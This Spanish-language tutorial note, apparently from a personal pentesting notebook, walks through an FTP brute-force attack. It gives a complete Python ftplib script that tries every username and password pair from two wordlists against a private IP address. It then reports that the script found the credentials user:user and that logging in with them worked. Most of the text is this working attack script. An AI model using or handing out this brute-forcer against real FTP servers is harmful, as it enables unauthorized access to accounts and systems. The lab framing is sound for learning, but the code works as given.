Para ello vamos a utilizar la librería ftplib y tener dos ficheros de textos donde uno contenga los posibles usuarios y otro las posibles contraseñas:
![[Pasted image 20221217090603.png]]
![[Pasted image 20221217090607.png]]
Y a continuación utilizamos este código donde se hará el ataque de fuerza bruta FTP utilizando estos dos ficheros de texto:
```python
import ftplib

def ataque(ip,usuario,password):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(usuario,password)
        ftp.quit()
        print('User: {}:{}'.format(usuario,password))
    except:
        print("Falló la autenticación")

ip = '10.10.0.0'
usuarios = open('usuarios.txt','r')
usuarios = usuarios.read().split('\n')
passwords = open('passwords.txt','r')
passwords = passwords.read().split('\n')

for u in usuarios:
    for p in passwords:
        ataque(ip,u,p)
```
Y si lanzamos el script vemos que nos encuentra un login correcto con el usuario y contraseña user:user:+
![[Pasted image 20221217090641.png]]
Y vemos que si probamos con user y user nos inicia la sesión:

![[Pasted image 20221217090651.png]]
O incluso se puede mejorar este código:
![[Pasted image 20221217090713.png]]
![[Pasted image 20221217090720.png]]

